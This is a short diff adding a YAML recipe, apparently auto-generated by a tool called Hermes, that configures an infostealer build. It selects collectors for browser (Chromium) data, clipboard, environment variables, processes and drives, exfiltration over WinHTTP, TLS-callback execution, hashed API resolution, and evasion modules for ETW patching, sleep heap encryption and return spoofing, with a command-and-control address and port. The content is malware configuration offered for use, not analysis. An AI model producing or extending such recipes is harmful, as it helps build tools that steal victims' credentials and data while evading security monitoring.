@@ -1,0 +1,24 @@
+name: infostealer_cs_new_arch_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes_api
+- collectors/browser_chromium
+- collectors/clipboard
+- collectors/env_vars
+- collectors/drives
+exfil: exfil/winhttp_api
+arch: arch/tls_callback
+resources: true
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/etw_patch
+- evasion/sleep_heap_encrypt
+- evasion/ret_spoof
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
